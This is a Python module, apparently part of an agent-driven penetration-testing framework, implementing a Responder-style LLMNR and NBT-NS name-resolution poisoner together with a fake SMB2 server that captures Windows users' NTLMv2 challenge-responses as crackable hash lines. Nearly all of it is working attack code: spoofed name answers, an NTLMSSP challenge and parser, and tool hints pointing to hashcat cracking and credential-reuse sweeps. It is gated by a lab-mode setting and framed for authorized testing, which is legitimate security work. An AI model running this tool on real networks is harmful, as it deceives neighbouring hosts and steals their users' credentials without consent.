"""Responder analog v1 — CAPTURE-ONLY LLMNR/NBT-NS poisoner + SMB2 sink.

The Phase-4 credential-motion opener (todo.md). Windows clients fall back
to LLMNR (UDP 5355, multicast 224.0.0.252) and NBT-NS (UDP 137, broadcast)
whenever DNS answers "no such name" — and both legacy protocols have NO
server authentication, so any host in the segment may answer. This module
answers with OUR IP; the victim then authenticates to our self-contained
SMB2 sink (TCP 445) and the NTLMv2 challenge-response becomes a
hashcat-(-m 5600) / john-(-format=netntlmv2) crackable line.

CAPTURE-ONLY, BY DESIGN: the sink completes exactly one auth exchange and
then answers STATUS_LOGON_FAILURE. There is no relay code path — relaying
(ntlmrelayx-class) is parked by policy and this module stays out of it:
a capture that cracks is the whole v1 story. The blue-team answer to this
whole technique is a GPO disabling LLMNR/NBT-NS; that belongs in the
finding, not in a feature request.

LAB GATE (mirrors evasion/shaping.py): poisoning is deceptive traffic to
real neighbours — refused unless SHAPING_LAB_MODE="1" (1/true/yes/on) in
the root .env. The scope gate is untouched and irrelevant here by design:
poisoning answers the SEGMENT, not a blessed target — the lab gate is the
operator's control, and `responder_status`/`responders_stop` keep custody.

WIRE NOTES (v1, deliberately small):
- LLMNR only answers IPv4/A queries (clients also ask AAAA; ignoring it
  halves visibility, not correctness — the sink is what matters). TTL 30s.
- NBT-NS answers the question verbatim with an NB record (type 0x20,
  our IP); first-level-encoded names only (suffix 0x20/0x00/0x03 seen).
- Own-name blacklist: our hostname (short + FQDN variants) and `wpad`
  are never answered — self-DoS and WPAD-proxy capture are v2 concerns.
- SMB2 sink: dialect 2.0.2 raw-NTLMSSP lane (no SPNEGO on 2.0.2 — the
  simplest wire Windows accepts); SMB1 (0xFF 'SMB') connections are
  counted and closed — modern lab VMs negotiate 2.0.2+.
- Port 445 is privileged (<1024): starts fail-closed with the
  setcap/sudo remediation; UDP 137/5355 are unprivileged everywhere.

Long-running listener: `responders_start` returns a job_id immediately
(background job pattern, detached subprocess + JSON sidecar); captures
persist to ``run/responder/captures.jsonl`` (0600) — job polls survive a
frame restart, and each capture also lands in namespaced vector memory
(`remember_text`, namespace 'responder') so the secretary recalls it.
"""
from __future__ import annotations

import json
import os
import socket
import struct
import sys
import threading
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

if __package__ in (None, ""):
    # Direct execution (the job subprocess): `python listeners/x.py` puts
    # listeners/ on sys.path instead of the checkout root — same pitfall
    # AGENTS.md documents for listeners/thebrain.py. Insert the root first
    # so framework imports resolve in the detached process too.
    _ROOT = Path(__file__).resolve().parent.parent
    if str(_ROOT) not in sys.path:
        sys.path.insert(0, str(_ROOT))

from constants import framework_tool
from utils.background_job import launch_job, poll_job, terminate_job

# Opt out of the static LOCAL_FILE mint: the module's argparse (job-main
# plumbing) must NOT surface as a second, gate-bypassing "start poisoning"
# entry beside the decorated responder tools. Registry convention — see
# daharness/registry.py extract_module_profile.
_NO_LOCAL_TOOL = True

_TOOL_NAME = "responder"
_CAPTURE_DIR = "responder"         # under <workspace>/run/
_JOB_TIMEOUT_S = float(os.getenv("RESPONDER_JOB_TIMEOUT_H", "12")) * 3600

LLMNR_GROUP = "224.0.0.252"
LLMNR_PORT = 5355
NBNS_PORT = 137
SMB_PORT = 445
_LLMNR_TTL = 30


def _lab_mode() -> bool:
    """Same gate convention as evasion/shaping.py ($SHAPING_LAB_MODE)."""
    return os.getenv("SHAPING_LAB_MODE", "").strip().lower() in (
        "1", "true", "yes", "on")


def responder_run_dir() -> Path:
    """``<workspace>/run/responder`` — 0700/0600, scratch-store conventions."""
    from constants import resolve_workspace_root

    d = resolve_workspace_root() / "run" / _CAPTURE_DIR
    d.mkdir(parents=True, exist_ok=True, mode=0o700)
    try:
        os.chmod(d, 0o700)
    except OSError:
        pass  # root-owned repair parity with the scratch store
    return d


def capture_file() -> Path:
    return responder_run_dir() / "captures.jsonl"


# --- identity blacklist -----------------------------------------------------

def _own_names() -> List[str]:
    names = [os.uname().nodename.lower()] if hasattr(os, "uname") else []
    if names and "." in names[0]:
        short = names[0].split(".")[0]
        if short:
            names.append(short)
    return [n for n in names if n]


def _should_poison(name: str) -> Tuple[bool, str]:
    """Blacklist decision for a queried name (lowercased)."""
    n = (name or "").strip().lower().rstrip(".")
    if not n:
        return False, "empty"
    if n in _own_names():
        return False, "own hostname"
    if n == "wpad":
        return False, "wpad (HTTP-proxy lane, not wired in v1)"
    return True, ""


# --- NBT-NS first-level name codec -----------------------------------------

def decode_netbios_name(enc: bytes) -> str:
    """First-level decode: 32 half-byte chars -> 15-char name + 2-digit
    suffix (returned as ``NAME         20`` — callers strip for the bare
    name). Empty/garbage input degrades to ""/junk, never raises."""
    try:
        if not enc:
            return ""
        bits = enc[:32]
        out = bytearray()
        for i in range(0, len(bits) - 1, 2):
            hi = (bits[i] - ord("A")) & 0x0F
            lo = (bits[i + 1] - ord("A")) & 0x0F
            out.append((hi << 4) | lo)
        # raw layout: 15-char space-padded name + 1 suffix byte = 16 bytes
        name = out[:15]
        suffix = out[15] if len(out) > 15 else 0
        return f"{name.decode('ascii', 'replace')}{suffix:02X}"
    except Exception:  # noqa: BLE001 - hostile packets never kill the engine
        return ""


def encode_netbios_name(name: str, suffix: int = 0x20) -> bytes:
    """First-level encode (15-char space-padded name + suffix byte)."""
    padded = name.upper().encode("ascii", "replace")[:15].ljust(15)
    raw = padded + bytes([suffix])
    return "".join(
        chr(ord("A") + (b >> 4)) + chr(ord("A") + (b & 0x0F)) for b in raw
    ).encode()


# --- LLMNR ------------------------------------------------------------------

def build_llmnr_response(query: bytes, our_ip: str) -> Optional[bytes]:
    """Answer an LLMNR **A** query with ``our_ip`` (unicast to the querier).

    AAAA (and other qtypes) return None — silently ignored: answering an
    address query of the wrong family is a protocol violation, and the
    sink is IPv4 in v1 anyway.
    """
    if len(query) < 13:
        return None
    q_id, _flags, qd = struct.unpack("!HHH", query[:6])
    if qd < 1:
        return None
    try:
        pos = 12
        while query[pos] != 0:
            step = query[pos]
            if step & 0xC0 or pos + 1 + step > len(query):  # compressed
                return None
            pos += 1 + step
        qtype, _qclass = struct.unpack_from("!HH", query, pos + 1)
    except (IndexError, struct.error):
        return None
    if qtype != 1:  # A only (AAAA ignored, see above)
        return None
    answer = struct.pack("!HHIH", 0xC00C, 1, _LLMNR_TTL, 4)
    answer += socket.inet_aton(our_ip)
    return (
        struct.pack("!HHHHHH", q_id, 0x8000, 1, 1, 0, 0)
        + query[12: pos + 5]  # question verbatim (name + type + class)
        + answer
    )


# --- NBT-NS -----------------------------------------------------------------

def build_nbns_response(query: bytes, our_ip: str) -> Optional[bytes]:
    """Answer an NB (type 0x20) name query: question echo + NB record = us."""
    if len(query) < 14:
        return None
    trn_id, _, qd = struct.unpack("!HHH", query[:6])
    if qd < 1:
        return None
    nb_len = query[12]
    q_end = 12 + 1 + nb_len + 1 + 4  # len byte + encoded name + null + type/class
    if q_end > len(query):
        return None
    name_blob = query[12: 14 + nb_len]              # \xNN<encoded>\x00
    q_tail = query[14 + nb_len: q_end]              # qtype + qclass
    rr = (
        struct.pack("!HHIH", 0x20, 1, _LLMNR_TTL, 6)
        + struct.pack("!HH", 0x0000, 0x0000)        # NB flags: unique owner
        + socket.inet_aton(our_ip)
    )
    return (
        struct.pack("!HHHHHH", trn_id, 0x8400, 1, 1, 0, 0)
        + name_blob + q_tail + name_blob + rr
    )


# --- NTLMSSP ----------------------------------------------------------------

_NTLMSSP_SIG = b"NTLMSSP\x00"
TYPE1, TYPE2, TYPE3 = 1, 2, 3


def _target_info(target: str) -> bytes:
    """MS-NLMP TargetInfo AV list. Sends the realistic full set + EOL —
    impacket's v2 compute subscribes to `avg DnsHostname` (its table maps
    type 3, where MS-NLMP canonical MsvAvDnsDomainName=3/MsvAvDnsHostName=4,
    so both 3 and 4 ride along and every client finds what it wants)."""
    def av(t: int, v: bytes) -> bytes:
        return struct.pack("<HH", t, len(v)) + v

    node = (os.uname().nodename if hasattr(os, "uname") else target)
    host = node.split(".")[0].encode("utf-8", "replace")[:62]
    dom = target.encode("utf-8", "replace")[:62]
    return (
        av(1, host)   # MsvAvNbComputerName (impacket "Hostname")
        + av(2, dom)  # MsvAvNbDomainName (impacket "Domainname")
        + av(3, dom)  # MS DnsDomainName (impacket "DnsHostname")
        + av(4, host) # MS DnsHostName (impacket "DnsDomainname")
        + b"\x00\x00\x00\x00"
    )


def build_ntlmssp_challenge(challenge: bytes, target: str = "WORKGROUP") -> bytes:
    """NTLMSSP Type-2: NTLM (+extended security) — steers NTLMv2 clients."""
    flags = (
        0x00000001   # NEGOTIATE_SIGN
        | 0x00000004  # REQUEST_TARGET
        | 0x00008000  # NEGOTIATE_ALWAYS_SIGN
        | 0x00080000  # NEGOTIATE_EXTENDED_SECURITY -> v2
        | 0x00100000  # TARGET_TYPE_DOMAIN
        | 0x00200000  # NEGOTIATE_NTLM
    )
    tname = target.encode("utf-8", "replace")
    tinfo = _target_info(target)
    version = b"\x06\x00\x23\x05\x00\x66\x0f\x00"
    # Offsets are MS-NLMP-relative (message start): version present -> payload
    # region begins at 56 (sig 8 + type 4 + fields 44).
    body = struct.pack(
        "<HHII8s8sHHI8s",
        len(tname), len(tname), 56, flags,
        challenge, b"\x00" * 8,
        len(tinfo), len(tinfo), 56 + len(tname), version,
    )
    return _NTLMSSP_SIG + struct.pack("<I", TYPE2) + body + tname + tinfo


def _short_len_off(buf: bytes, off: int) -> Tuple[int, int]:
    ln, mx, at = struct.unpack_from("<HHI", buf, off)
    return ln, at


def parse_ntlmssp_auth(buf: bytes, challenge_hex: str) -> Optional[Dict[str, Any]]:
    """Parse a Type-3 into a hashcat -m 5600 / john netntlmv2 hash line.

    Returns ``{user, domain, workstation, hash_line, lm_cred}`` or None.
    The client-side blob is echoed verbatim (its own bytes authenticate the
    capture — we never interpret it beyond the 16-byte HMAC prefix).
    """
    try:
        if not buf.startswith(_NTLMSSP_SIG):
            return None
        msg_type = struct.unpack_from("<I", buf, 8)[0]
        if msg_type != TYPE3:
            return None
        ln_lm, off_lm = _short_len_off(buf, 12)
        ln_nt, off_nt = _short_len_off(buf, 20)
        ln_dom, off_dom = _short_len_off(buf, 28)
        ln_user, off_user = _short_len_off(buf, 36)
        ln_ws, off_ws = _short_len_off(buf, 44)

        def _u16(b: bytes, at: int, ln: int) -> str:
            return b[at: at + ln].decode("utf-16le", "replace") if ln else ""

        user = _u16(buf, off_user, ln_user) or "unknown"
        domain = _u16(buf, off_dom, ln_dom) or ""
        workstation = _u16(buf, off_ws, ln_ws) or ""
        nt = buf[off_nt: off_nt + ln_nt]
        if len(nt) < 16 + 4:
            return None
        hmac_part = nt[:16].hex()
        blob = nt[16:].hex()
        hash_line = f"{user}::{domain}:{challenge_hex}:{hmac_part}:{blob}"
        del ln_lm, off_lm
        return {
            "user": user, "domain": domain, "workstation": workstation,
            "hash_line": hash_line,
        }
    except Exception:  # noqa: BLE001 - malformed auth: refuse, don't crash
        return None


# --- SMB2 wire pieces -------------------------------------------------------

_SMB2_PROTO_ID = b"\xfeSMB"
_MORE_PROCESSING_REQUIRED = 0xC0000016
_LOGON_FAILURE = 0xC000006A   # STATUS_LOGON_FAILURE (0xC0000064 is no-such-user)


def _smb2_header(command: int, status: int, msg_id: int, session_id: int = 0) -> bytes:
    return _SMB2_PROTO_ID + struct.pack(
        "<HHIHHIIQIIQ16s",
        64, 1,             # structure size, credit charge
        status, command, 1, 0, 0, msg_id, 0, 0, session_id,
        b"\x00" * 16,      # signature (signing never negotiated in v1)
    )


def _filetime_now() -> int:
    return int((time.time() + 11644473600) * 10_000_000) & 0xFFFF_FFFF_FFFF_FFFF


def build_negotiate_response(msg_id: int) -> bytes:
    """Dialect 2.0.2 negotiate response (StructureSize value 65).

    Empty security buffer: on 2.0.2 the next thing the client sends is the
    SESSION_SETUP request carrying its NTLMSSP type-1 (raw, no SPNEGO).
    MS-SMB2 2.2.4 2.0.0.2 layout: StructureSize, SecurityMode,
    DialectRevision, Reserved, ServerGuid, Capabilities, MaxTransact/Read/
    Write (u32 each), SystemTime, ServerStartTime (u64), SecurityBufferOffset/Len.
    """
    body = struct.pack(
        "<HHHH16sIIIIQQHHI",
        65, 0x0001, 0x0202, 0x0000,
        os.urandom(16),
        0, 0x100000, 0x100000, 0x100000,
        _filetime_now(), _filetime_now(),
        128, 0,   # SecurityBufferOffset/Len — impacket's BodyLen=64 convention
        0,        # NegotiateContextOffset (non-3.1.1: absent/zero)
    )
    return _smb2_header(0x0000, 0x00000000, msg_id) + body


def build_session_setup_response(
    msg_id: int, ntlmssp: bytes, session_id: int = 0
) -> bytes:
    # SessionSetup Response: StructureSize 9, Flags, SecurityBufferOffset,
    # SecurityBufferLength; buffer rides at 64 + 8 = 72.
    body = struct.pack("<HHHH", 9, 0, 72, len(ntlmssp))
    return _smb2_header(0x0001, _MORE_PROCESSING_REQUIRED, msg_id, session_id) \
        + body + ntlmssp


def build_logon_failure(msg_id: int, session_id: int = 0) -> bytes:
    body = struct.pack("<HHHH", 9, 0, 0, 0)
    return _smb2_header(0x0001, _LOGON_FAILURE, msg_id, session_id) + body


# --- capture persistence -----------------------------------------------------

def _store_capture(entry: Dict[str, Any]) -> None:
    path = capture_file()
    line = json.dumps(entry, sort_keys=True) + "\n"
    try:
        with open(path, "a", encoding="utf-8", opener=lambda p, f: os.open(
                p, f, 0o600)) as fh:
            fh.write(line)
        os.chmod(path, 0o600)
    except Exception:  # noqa: BLE001 - persistence must never kill the engine
        pass
    try:
        from utils.memory_tools import remember_text

        remember_text(
            "NTLMv2 captured (responder, capture-only): "
            f"{entry['hash_line']}",
            namespace="responder",
            memory_id=f"resp_cap_{entry['challenge_hex']}_"
                      f"{entry['user']}_{int(entry['ts'])}",
            important=True,
        )
    except Exception:  # noqa: BLE001 - memory write degrades, never blocks
        pass


# --- engines -----------------------------------------------------------------

class PoisonEngine:
    """UDP poisoner for one protocol (LLMNR or NBT-NS). One thread."""

    def __init__(self, proto: str, iface_ip: str, port: int,
                 on_query: Optional[callable] = None) -> None:
        self.proto = proto  # "llmnr" | "nbns"
        self.iface_ip = iface_ip
        self.port = port
        self.on_query = on_query or (lambda *a, **k: None)
        self.sock: Optional[socket.socket] = None
        self.thread: Optional[threading.Thread] = None
        self._stop = threading.Event()

    def start(self) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.iface_ip or "0.0.0.0", self.port))
        if self.proto == "llmnr":
            try:
                mreq = socket.inet_aton(LLMNR_GROUP) + socket.inet_aton(
                    self.iface_ip or "0.0.0.0")
                s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
                # unicast replies need membership-level loopback OFF for clean
                # segments (our own answers never re-enter the group)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
            except OSError:
                pass  # bind-only mode still answers direct UDP probes
        s.settimeout(0.5)
        self.sock = s
        self.thread = threading.Thread(
            target=self._loop, name=f"responder-{self.proto}", daemon=True)
        self.thread.start()

    def _loop(self) -> None:
        while not self._stop.is_set():
            try:
                data, addr = self.sock.recvfrom(1500)
            except socket.timeout:
                continue
            except OSError:
                break
            name = self._question_name(data)
            ok, why = _should_poison(name)
            self.on_query(data, addr, name, ok, why)
            if not ok:
                continue
            if self.proto == "llmnr":
                resp = build_llmnr_response(data, self.iface_ip)
            else:
                resp = build_nbns_response(data, self.iface_ip)
            if resp:
                try:
                    self.sock.sendto(resp, addr)
                except OSError:
                    pass

    def _question_name(self, data: bytes) -> str:
        if self.proto == "nbns" and len(data) > 46:
            return decode_netbios_name(data[13:49]).rstrip(" 0123456789ABCDEF")[:15].strip()
        if self.proto == "llmnr" and len(data) > 13:
            pos, labels = 12, []
            try:
                while data[pos] != 0 and pos + 1 + data[pos] <= len(data):
                    labels.append(data[pos + 1: pos + 1 + data[pos]].decode(
                        "ascii", "replace"))
                    pos += 1 + data[pos]
            except IndexError:
                return ""
            return ".".join(labels)
        return ""
        # (NBNS decode carries the suffix byte; the strip keeps the bare name)

    def stop(self) -> None:
        self._stop.set()
        try:
            if self.sock:
                self.sock.close()
        except OSError:
            pass


class SMB2CaptureSink:
    """TCP 445 self-contained sink: negotiate -> challenge -> capture -> deny."""

    def __init__(self, iface_ip: str, port: int,
                 on_capture: Optional[Callable] = None,
                 on_error: Optional[Callable] = None) -> None:
        self.iface_ip = iface_ip
        self.port = port
        self.on_capture = on_capture or (lambda *a, **k: None)
        self.on_error = on_error or (lambda *a, **k: None)
        self.sock: Optional[socket.socket] = None
        self.thread: Optional[threading.Thread] = None
        self._stop = threading.Event()
        self.smb1_seen = 0

    def start(self) -> None:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.iface_ip or "0.0.0.0", self.port))
        s.listen(8)
        s.settimeout(0.5)
        self.sock = s
        self.thread = threading.Thread(
            target=self._loop, name="responder-smb2", daemon=True)
        self.thread.start()

    def _loop(self) -> None:
        while not self._stop.is_set():
            try:
                conn, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(
                target=self._serve, args=(conn, addr), daemon=True).start()

    def _serve(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
        challenge = os.urandom(8)
        conn.settimeout(10)
        try:
            for _ in range(24):  # bounded exchanges; never a session
                nb = self._read_nbss(conn)
                if nb is None:
                    return
                data = nb
                if data[:4] != _SMB2_PROTO_ID:
                    self.smb1_seen += 1  # SMB1 (0xFF 'SMB') — not wired in v1
                    return
                msg_id = struct.unpack_from("<Q", data, 24)[0]
                command = struct.unpack_from("<H", data, 12)[0]  # MS-SMB2: Command@12
                if command == 0x0000:  # NEGOTIATE
                    conn.sendall(_nbss_wrap(build_negotiate_response(msg_id)))
                elif command == 0x0001:  # SESSION_SETUP
                    # SessionSetupReq (StructureSize 25): @64 size, @66/67
                    # flags/mode (u8s), @68 caps, @72 channel,
                    # @76 SecurityBufferOffset, @78 Length.
                    buf_off = struct.unpack_from("<H", data, 76)[0]
                    buf_len = struct.unpack_from("<H", data, 78)[0]
                    blob = data[buf_off: buf_off + buf_len]
                    sig_at = blob.find(_NTLMSSP_SIG)
                    if sig_at < 0:
                        conn.sendall(_nbss_wrap(build_logon_failure(msg_id)))
                        return
                    if _is_ntlmssp_type(blob[sig_at:], TYPE1):
                        # first setup leg: NTLMSSP type-1 -> issue challenge
                        conn.sendall(_nbss_wrap(build_session_setup_response(
                            msg_id, _spnego_wrap(
                                build_ntlmssp_challenge(challenge)))))
                        continue
                    auth = parse_ntlmssp_auth(blob[sig_at:], challenge.hex())
                    if auth is None:
                        conn.sendall(_nbss_wrap(build_logon_failure(msg_id)))
                        return
                    self.on_capture({
                        "ts": time.time(), "proto": "smb2",
                        "victim_ip": addr[0], "victim_port": addr[1],
                        "challenge_hex": challenge.hex(),
                        "user": auth["user"], "domain": auth["domain"],
                        "workstation": auth["workstation"],
                        "hash_line": auth["hash_line"],
                    })
                    conn.sendall(_nbss_wrap(build_logon_failure(msg_id)))
                    challenge = os.urandom(8)
                else:
                    conn.sendall(_nbss_wrap(build_logon_failure(msg_id)))
                    return
        except (OSError, struct.error):
            return
        except Exception:  # noqa: BLE001 - surfaced to the lane log, never fatal
            try:
                import traceback

                self.on_error(traceback.format_exc())
            except Exception:
                pass
            return
        finally:
            try:
                conn.close()
            except OSError:
                pass

    @staticmethod
    def _read_nbss(conn: socket.socket) -> Optional[bytes]:
        """Read one NBSS-framed SMB2 message; NetBIOS session requests
        (0x81) are answered positive (0x82) and skipped — direct-hosting on
        445 never sends them, but non-445/139-style clients do."""
        for _ in range(8):  # at most a few preamble handshakes
            head = conn.recv(4)
            if len(head) < 4:
                return None
            nb_type = head[0]
            (length,) = struct.unpack("!H", head[2:4])
            if nb_type == 0x00:  # session message
                data = b""
                while len(data) < length:
                    chunk = conn.recv(length - len(data))
                    if not chunk:
                        return None
                    data += chunk
                return data
            if nb_type == 0x81:  # session request -> accept
                payload = b""
                while len(payload) < length:
                    payload += conn.recv(length - len(payload))
                conn.sendall(b"\x82\x00\x00")
                continue
            return None  # 0x83 negative / unknown — not a session
        return None

    def stop(self) -> None:
        self._stop.set()
        try:
            if self.sock:
                self.sock.close()
        except OSError:
            pass


def _asn1_len(b: bytes) -> bytes:
    n = len(b)
    if n < 128:
        return bytes([n]) + b
    if n < 256:
        return bytes([0x81, n]) + b
    return bytes([0x82, n >> 8, n & 0xFF]) + b


def _spnego_wrap(tok: bytes) -> bytes:
    """Byte-exact SPNEGO negTokenResp for impacket-class clients:
    ``a1 [ 30 [ a0 NegState=accept-incomplete, a2 [04 <token>] ] ]`` —
    mirrors impacket.spnego.SPNegoNegTokenResp.fromString's walk (a1 → 30 →
    a0/enumerated → a2/octet-string). NTLMSSP tokens ride the a2 branch."""
    token = b"\x04" + _asn1_len(tok) + tok               # OCTET STRING
    response = b"\xa2" + _asn1_len(token) + token        # [2] ResponseToken
    state = b"\xa0\x03\x0a\x01\x01"                     # [0] accept-incomplete
    seq = b"\x30" + _asn1_len(state + response) + state + response
    return b"\xa1" + _asn1_len(seq) + seq


def _nbss_wrap(msg: bytes) -> bytes:
    """NBSS session-message framing (type 0 + 24-bit length) — required in
    BOTH directions even on 445 direct hosting (impacket reads it too)."""
    return b"\x00" + struct.pack("!I", len(msg))[1:] + msg


def _is_ntlmssp_type(buf: bytes, want: int) -> bool:
    return (
        buf.startswith(_NTLMSSP_SIG)
        and len(buf) >= 12
        and struct.unpack_from("<I", buf, 8)[0] == want
    )


# --- job process --------------------------------------------------------------

def _pick_ip(iface: str) -> str:
    """Default-route source IP (connect-probe trick); '0.0.0.0' fallback."""
    if iface:
        return iface
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("10.254.254.254", 1))
        return s.getsockname()[0]
    except OSError:
        return "0.0.0.0"
    finally:
        s.close()


def run_job_process(argv: List[str]) -> int:
    """Long-lived engines; SIGTERM cleans up. Captures persist to run/ + memory."""
    # Belt for any invocation path (the gate also lives in responders_start,
    # and discovery-avoidance via _NO_LOCAL_TOOL is the hat): a raw job-main
    # start without the lab gate is still a refusal.
    if not _lab_mode():
        print(
            "responder: LLMNR/NBT-NS poisoning refused without "
            'SHAPING_LAB_MODE="1" in the root .env (evasion lab gate).',
            file=sys.stderr,
        )
        return 2

    import argparse

    ap = argparse.ArgumentParser()
    ap.add_argument("--run-job", action="store_true")
    ap.add_argument("--iface", default="")
    ap.add_argument("--llmnr-port", type=int, default=LLMNR_PORT)
    ap.add_argument("--nbns-port", type=int, default=NBNS_PORT)
    ap.add_argument("--smb-port", type=int, default=SMB_PORT)
    args, _ = ap.parse_known_args(argv)

    LOG = responder_run_dir() / "activity.log"

    def fh_log(msg: str) -> None:
        try:
            with open(LOG, "a", encoding="utf-8", opener=lambda p, f: os.open(
                    p, f, 0o600)) as fh:
                fh.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
        except Exception:
            pass

    iface_ip = _pick_ip(args.iface)

    def _on_capture(entry: Dict[str, Any]) -> None:
        _store_capture(entry)
        fh_log(f"CAPTURE {entry['user']}::{entry['domain']} "
               f"from {entry['victim_ip']} challenge={entry['challenge_hex']}")

    def _on_query(kind: str) -> Callable[..., None]:
        def cb(data: bytes, addr: Tuple[str, int], name: str,
               ok: bool, why: str) -> None:
            fh_log(f"{kind} query {name!r} from {addr[0]} -> "
                   f"{'ANSWER' if ok else 'SKIP ' + why}")
        return cb

    llmnr = PoisonEngine(
        "llmnr", iface_ip, args.llmnr_port, on_query=_on_query("LLMNR"))
    nbns = PoisonEngine(
        "nbns", iface_ip, args.nbns_port, on_query=_on_query("NBNS"))
    sink = SMB2CaptureSink(iface_ip, args.smb_port, on_capture=_on_capture)
    engines: List[Any] = [llmnr, nbns, sink]

    import signal

    stop_event = threading.Event()

    def _term(signum, frame):  # noqa: ARG001
        stop_event.set()

    signal.signal(signal.SIGTERM, _term)
    signal.signal(signal.SIGINT, _term)

    fh_log(f"responder job up: iface={iface_ip} llmnr={args.llmnr_port} "
           f"nbns={args.nbns_port} smb={args.smb_port}")
    for eng in engines:
        eng.start()
    try:
        while not stop_event.wait(timeout=5):
            pass  # heartbeat; engines are daemon threads
    finally:
        fh_log("responder job stopping")
        for eng in engines:
            eng.stop()
    return 0


# --- framework tools ----------------------------------------------------------

def _four45_capable() -> Tuple[bool, str]:
    """Fail-closed port-445 capability probe with the remediation string."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", SMB_PORT))
        s.close()
        return True, ""
    except PermissionError:
        return False, (
            f"TCP {SMB_PORT} is a privileged port: run the framework under a "
            "user with that capability, or grant it: "
            "setcap cap_net_bind_service+ep <venv>/bin/python"
        )
    except OSError as e:
        return False, f"TCP {SMB_PORT} bind failed: {e}"


@framework_tool(
    "Start the CAPTURE-ONLY Responder analog: answers LLMNR (UDP 5355) and "
    "NBT-NS (UDP 137) name queries on this segment with our IP (except own "
    "hostname and wpad), and runs a self-contained SMB2 sink on TCP 445 that "
    "issues a challenge and captures the victim's NTLMv2 response as a "
    "hashcat -m 5600 / john netntlmv2 hash line. Capture-only: every auth is "
    "answered LOGON_FAILURE — no relay code path exists. Each capture "
    "persists to run/responder/captures.jsonl and lands in vector memory "
    "(namespace 'responder', marked important). Requires SHAPING_LAB_MODE=1 "
    "in .env (deceptive wire traffic) and a privileged or cap_net_bind_service "
    "TCP 445 bind.",
    next_hints=[
        "responders_status to watch engines + capture count",
        "run_hashcat mode 5600 (or run_john) on a captured hash line",
        "credential-reuse sweep: validate each recovered credential exactly "
        "once against each other reachable service, then report_finding",
    ],
    tags=["net.services"],
)
def responders_start(
    iface: str = "",
    llmnr_port: int = LLMNR_PORT,
    nbns_port: int = NBNS_PORT,
    smb_port: int = SMB_PORT,
) -> Dict[str, Any]:
    """Start poisoner + sink as a background job; returns a job_id."""
    if not _lab_mode():
        from utils.scope_gate import ScopeGateError

        raise ScopeGateError(
            "responder: LLMNR/NBT-NS poisoning is deceptive segment traffic — "
            'refused without SHAPING_LAB_MODE="1" in the root .env '
            "(evasion lane lab gate).")
    ok, why = _four45_capable()
    if not ok:
        from utils.scope_gate import ScopeGateError

        raise ScopeGateError(f"responder: {why}")
    this = Path(__file__).resolve()
    argv = [
        sys.executable, str(this), "--run-job",
        "--iface", iface or "",
        "--llmnr-port", str(int(llmnr_port)),
        "--nbns-port", str(int(nbns_port)),
        "--smb-port", str(int(smb_port)),
    ]
    job = launch_job(
        argv,
        tool_name=_TOOL_NAME,
        timeout=_JOB_TIMEOUT_S,
        log_dir=str(responder_run_dir()),
    )
    return {"status": "Success", "job_id": job["job_id"],
            "iface_ip": _pick_ip(iface),
            "llmnr": llmnr_port, "nbns": nbns_port, "smb": smb_port,
            "capture_file": str(capture_file()),
            "mode": "capture-only (no relay code path)",
            "lab_gate": "SHAPING_LAB_MODE"}


@framework_tool(
    "Poll a responder job: engine liveness (from the job sidecar), capture "
    "count, and the most recent captured NTLMv2 hash lines. The secretary "
    "checks this after a wait instead of holding the turn open.",
    next_hints=[
        "responders_captures to pull the full hash lines",
        "run_hashcat mode 5600 on a captured hash",
    ],
    tags=["net.services"],
    untrusted_target=True,
)
def responders_status(job_id: str) -> Dict[str, Any]:
    poll = poll_job(job_id, tool_name=_TOOL_NAME)
    caps = _read_captures(limit=5)
    out = {"status": "Success", "job": poll, "captures": caps,
           "capture_count": _count_captures()}
    return out


@framework_tool(
    "Stop a responder job (clean SIGTERM; engines close their sockets).",
    tags=["net.services"],
)
def responders_stop(job_id: str) -> Dict[str, Any]:
    ok = terminate_job(job_id)
    return {"status": "Success", "job_id": job_id, "terminated": bool(ok)}


@framework_tool(
    "Return captured NTLMv2 hash lines from run/responder/captures.jsonl "
    "(hashcat -m 5600 / john netntlmv2 ready). Feed them straight to "
    "run_hashcat mode 5600 or run_john; the cred-reuse sweep applies after "
    "any recovery.",
    next_hints=[
        "run_hashcat mode 5600 with the captured hash line(s)",
        "credential-reuse sweep, then report_finding",
    ],
    tags=["net.services"],
    untrusted_target=True,
)
def responders_captures(q: int = 20) -> Dict[str, Any]:
    return {"status": "Success", "captures": _read_captures(limit=int(q))}


def _read_captures(limit: int) -> List[Dict[str, Any]]:
    path = capture_file()
    if not path.is_file():
        return []
    try:
        lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
    except OSError:
        return []
    out = []
    for line in lines[-limit:]:
        try:
            out.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return out


def _count_captures() -> int:
    path = capture_file()
    if not path.is_file():
        return 0
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return sum(1 for line in fh if line.strip())
    except OSError:
        return 0


__all__ = [
    "capture_file",
    "responders_captures",
    "responders_start",
    "responders_status",
    "responders_stop",
    "responder_run_dir",
    "SMB2CaptureSink",
    "PoisonEngine",
]

if __name__ == "__main__":  # job subprocess entry (see responders_start)
    run_job_process(sys.argv[1:])